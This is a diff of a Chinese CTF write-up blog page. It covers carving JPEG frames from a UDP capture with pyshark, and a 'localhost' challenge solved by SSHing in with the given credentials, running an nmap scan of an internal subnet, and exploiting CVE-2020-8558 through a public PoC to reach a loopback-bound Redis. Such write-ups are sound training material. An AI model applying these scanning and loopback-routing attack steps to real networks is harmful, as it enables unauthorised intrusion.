-<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>pyshark</span>
-
-<span style=color:#111>cap</span> <span style=color:#f92672>=</span> <span style=color:#111>pyshark</span><span style=color:#f92672>.</span><span style=color:#111>FileCapture</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lx100.pcap&#39;</span><span style=color:#111>)</span>
-<span style=color:#111>count</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-<span style=color:#00a8c8>for</span> <span style=color:#111>packet</span> <span style=color:#f92672>in</span> <span style=color:#111>cap</span><span style=color:#111>:</span>
-	<span style=color:#00a8c8>if</span> <span style=color:#d88200>&#34;UDP&#34;</span> <span style=color:#f92672>in</span> <span style=color:#111>packet</span> <span style=color:#f92672>and</span> <span style=color:#111>int</span><span style=color:#111>(</span><span style=color:#111>packet</span><span style=color:#111>[</span><span style=color:#d88200>&#39;udp&#39;</span><span style=color:#111>]</span><span style=color:#f92672>.</span><span style=color:#111>srcport</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>65415</span><span style=color:#111>:</span>
-		<span style=color:#111>count</span> <span style=color:#f92672>=</span> <span style=color:#111>count</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
-		<span style=color:#111>udp_bytes</span> <span style=color:#f92672>=</span> <span style=color:#111>bytearray</span><span style=color:#f92672>.</span><span style=color:#111>fromhex</span><span style=color:#111>(</span><span style=color:#111>packet</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#111>[</span><span style=color:#111>packet</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#f92672>.</span><span style=color:#111>find</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ffd8ffdb&#39;</span><span style=color:#111>):])</span>
-		<span style=color:#111>file_out</span> <span style=color:#f92672>=</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#d88200>&#39;out_files/&#39;</span> <span style=color:#f92672>+</span> <span style=color:#111>str</span><span style=color:#111>(</span><span style=color:#111>count</span><span style=color:#111>)</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;_packet.jpg&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;wb&#39;</span><span style=color:#111>)</span>
-		<span style=color:#111>file_out</span><span style=color:#f92672>.</span><span style=color:#111>write</span><span style=color:#111>(</span><span style=color:#111>udp_bytes</span><span style=color:#111>)</span>
-</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg alt=235_packet></p>
-<p><del>放大 再放大 每一根</del> 最后的flag是 <code>cybrics{Lost_Secrets_In_The_AIr}</code></p>
-<h2 id=localhost-network-hard-267-pts>localhost (Network, Hard, 267 pts)</h2>
-<blockquote>
-<p>Author: Vlad Roskov (<a href=https://t.me/mrvos>@mrvos</a>)</p>
-<p>Remember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.</p>
-<pre tabindex=0><code>ssh localhost@109.233.61.10
+foreach(file(&#34;hex.txt&#34;)as $i =&gt; $ln) {file_put_contents(&#34;frame$i.jpg&#34;,hex2bin(trim($ln)));}
+</code></pre><p>（以下是在<a href=https://scavengersecurity.com/posts/cybrics-lx100/>别的wp</a>中看到的py脚本： 可成功复现 导出455张jpg图</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pyshark</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#111>cap</span> <span style=color:#f92672>=</span> <span style=color:#111>pyshark</span><span style=color:#f92672>.</span><span style=color:#111>FileCapture</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lx100.pcap&#39;</span><span style=color:#111>)</span>
+</span></span><span style=display:flex><span><span style=color:#111>count</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span><span style=color:#00a8c8>for</span> <span style=color:#111>packet</span> <span style=color:#f92672>in</span> <span style=color:#111>cap</span><span style=color:#111>:</span>
+</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span> <span style=color:#d88200>&#34;UDP&#34;</span> <span style=color:#f92672>in</span> <span style=color:#111>packet</span> <span style=color:#f92672>and</span> <span style=color:#111>int</span><span style=color:#111>(</span><span style=color:#111>packet</span><span style=color:#111>[</span><span style=color:#d88200>&#39;udp&#39;</span><span style=color:#111>]</span><span style=color:#f92672>.</span><span style=color:#111>srcport</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>65415</span><span style=color:#111>:</span>
+</span></span><span style=display:flex><span>		<span style=color:#111>count</span> <span style=color:#f92672>=</span> <span style=color:#111>count</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>		<span style=color:#111>udp_bytes</span> <span style=color:#f92672>=</span> <span style=color:#111>bytearray</span><span style=color:#f92672>.</span><span style=color:#111>fromhex</span><span style=color:#111>(</span><span style=color:#111>packet</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#111>[</span><span style=color:#111>packet</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#f92672>.</span><span style=color:#111>find</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ffd8ffdb&#39;</span><span style=color:#111>):])</span>
+</span></span><span style=display:flex><span>		<span style=color:#111>file_out</span> <span style=color:#f92672>=</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#d88200>&#39;out_files/&#39;</span> <span style=color:#f92672>+</span> <span style=color:#111>str</span><span style=color:#111>(</span><span style=color:#111>count</span><span style=color:#111>)</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;_packet.jpg&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;wb&#39;</span><span style=color:#111>)</span>
+</span></span><span style=display:flex><span>		<span style=color:#111>file_out</span><span style=color:#f92672>.</span><span style=color:#111>write</span><span style=color:#111>(</span><span style=color:#111>udp_bytes</span><span style=color:#111>)</span>
+</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg alt=235_packet></p><p><del>放大 再放大 每一根</del> 最后的flag是 <code>cybrics{Lost_Secrets_In_The_AIr}</code></p><h2 id=localhost-network-hard-267-pts>localhost (Network, Hard, 267 pts)</h2><blockquote><p>Author: Vlad Roskov (<a href=https://t.me/mrvos>@mrvos</a>)</p><p>Remember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.</p><pre tabindex=0><code>ssh localhost@109.233.61.10
 Password: ohx7eeQu
-</code></pre><p>Your team token > Sw0T5cecsfJfaKApOiKzsA</p>
-</blockquote>
-<p>先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png alt=image-20210729122432345></p>
-<p>自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段<code>nmap -sS -Pn 10.193.10.7/24</code></p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png alt=image-20210729131318834></p>
-<p>发现10.193.10.180的80端口开放，用curl访问</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png alt=image-20210729131419115></p>
-<p>提示<em>Flag-containing-Records</em> 接着访问两个超链接的内容</p>
-<p><code>curl 10.193.10.180/redis.conf</code>是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：</p>
-<pre tabindex=0><code>bind 127.0.0.1
+</code></pre><p>Your team token > Sw0T5cecsfJfaKApOiKzsA</p></blockquote><p>先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png alt=image-20210729122432345></p><p>自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段<code>nmap -sS -Pn 10.193.10.7/24</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png alt=image-20210729131318834></p><p>发现10.193.10.180的80端口开放，用curl访问</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png alt=image-20210729131419115></p><p>提示<em>Flag-containing-Records</em> 接着访问两个超链接的内容</p><p><code>curl 10.193.10.180/redis.conf</code>是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：</p><pre tabindex=0><code>bind 127.0.0.1
 protected-mod yes
 port 6379
-</code></pre><p><code>curl 10.193.10.180/sysctl.conf</code>也是相关的配置文件 只有一句没被注释</p>
-<pre tabindex=0><code>net.ipv4.conf.all.route_localnet=1
-</code></pre><p>查google，发现了这些：<a href=https://github.com/kubernetes/kubernetes/issues/90259>net.ipv4.conf.all.route_localnet=1 opens security issue #90259</a> | <a href=https://github.com/tabbysable/POC-2020-8558>POC-2020-8558</a></p>
-<p>是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：</p>
-<blockquote>
-<p>In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the <code>net.ipv4.conf.all.route_localnet=1</code> sysctl setting. According to the kernel documentation, this setting makes the kernel &ldquo;not consider loopback addresses as martian&rdquo; &ndash; a consequence of which is that they could be accessed by other nodes on the network. That&rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!</p>
-<p>&mldr;&mldr;</p>
-<p>A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting <code>net.ipv4.conf.all.route_localnet=1</code> changes that &ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.</p>
-<p>So, if an attacker has a local connection to a target node with <code>net.ipv4.conf.all.route_localnet=1</code>, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.</p>
-<p>Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker&rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.</p>
-</blockquote>
-<p>（不得不说ipv4当初把整个<code>127.0.0.0/8</code>的地址都给了本地回环用真的是太慷慨了&mldr;&mldr; 到ipv6就只有一个<code>:: 1</code></p>
-<p>在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明</p>
-<blockquote>
-<p><strong>tst-2020-8558.py</strong>
-Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to <code>127.0.0.1</code> via your target, and looks to see if there is a reply.</p>
-<p><strong>poc-2020-8558.py</strong>
+</code></pre><p><code>curl 10.193.10.180/sysctl.conf</code>也是相关的配置文件 只有一句没被注释</p><pre tabindex=0><code>net.ipv4.conf.all.route_localnet=1
+</code></pre><p>查google，发现了这些：<a href=https://github.com/kubernetes/kubernetes/issues/90259>net.ipv4.conf.all.route_localnet=1 opens security issue #90259</a> | <a href=https://github.com/tabbysable/POC-2020-8558>POC-2020-8558</a></p><p>是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：</p><blockquote><p>In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the <code>net.ipv4.conf.all.route_localnet=1</code> sysctl setting. According to the kernel documentation, this setting makes the kernel &ldquo;not consider loopback addresses as martian&rdquo; &ndash; a consequence of which is that they could be accessed by other nodes on the network. That&rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!</p><p>&mldr;&mldr;</p><p>A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting <code>net.ipv4.conf.all.route_localnet=1</code> changes that &ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.</p><p>So, if an attacker has a local connection to a target node with <code>net.ipv4.conf.all.route_localnet=1</code>, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.</p><p>Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker&rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.</p></blockquote><p>（不得不说ipv4当初把整个<code>127.0.0.0/8</code>的地址都给了本地回环用真的是太慷慨了&mldr;&mldr; 到ipv6就只有一个<code>:: 1</code></p><p>在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明</p><blockquote><p><strong>tst-2020-8558.py</strong>
+Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to <code>127.0.0.1</code> via your target, and looks to see if there is a reply.</p><p><strong>poc-2020-8558.py</strong>
 Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default).
 Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal.
-Because this script uses raw sockets to send and receive the &ldquo;localhost&rdquo; packets, it works fine inside a normal unprivileged container.</p>
-</blockquote>
-<p>因为需要nc 所以另开一个shell</p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png alt=image-20210729153443403></p>
-<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png alt=image-20210729153501930></p>
-<p>参考：<a href="https://jan.show/?p=128">wp</a> | <a href=https://www.zhihu.com/question/49866806>为什么整个127.*网段都被拿来当做环回地址了？</a></p>
-<hr>
-<p>本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，<a href=https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw>此处是参考wp</a></p>
-<p>道阻且长呀，暑假要好好努力咯 (つд⊂)
-参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆</p>
-</div>
-</section>
-</article>
-</main>
-<div class="w-full h-0 flex-none order-3"></div>
-<aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
-<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
-<div class="md:max-w-xs flex flex-col md:items-end">
-<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
-<li class="px-1 md:px-0">
-<a href=/posts/ title="Posts page">
-Posts
-</a>
-</li>
-<li class="px-1 md:px-0">
-<a href=/relax/ title="Relaxxx page">
-Relaxxx
-</a>
-</li>
-<li class="px-1 md:px-0">
-<a href=/categories/ title="Categories page">
-Categories
-</a>
-</li>
-<li class="px-1 md:px-0">
-<a href=/tags/ title="Tags page">
-Tags
-</a>
-</li>
-<li class="px-1 md:px-0">
-<a href=/series/ title="Series page">
-Series
-</a>
-</li>
-<li class="px-1 md:px-0">
-<a href=/about/ title="About page">
-About
-</a>
-</li>
-<li class="px-1 md:px-0">
-<a href=/friends/ title="Friends page">
-Friends
-</a>
-</li>
-<div id=fastSearch class=m-0>
-<input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
-placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
-<ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400">
-</ul>
-</div>
-</ul>
-<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16">
-<a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window">
-<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg>
-</div>
-</a>
-<a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window">
-<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg>
-</div>
-</a>
-<a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window">
-<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg>
-</div>
-</a>
-<a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window">
-<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg>
-</div>
-</a>
-<a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window">
-<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg>
-</div>
-</a>
-<a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window">
-<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg>
-</div>
-</a>
-<a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window">
-<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg>
-</div>
-</a>
-<a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window">
-<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg>
-</div>
-</a>
-</div>
-<div class="text-sm text-gray-500 leading-tight a-gray">
-<br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 4627 words in this page.
-</div>
-</div>
-</div>
-</aside>
-<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
-<hr class=double-line>
-<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
-<a class=flex-grow-0 href=/friends/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
-Friends
-</a>
-<a class=flex-grow-0 href=/2021/08/05/dasctf0721-wp/>
-DasCTF0721 Wp
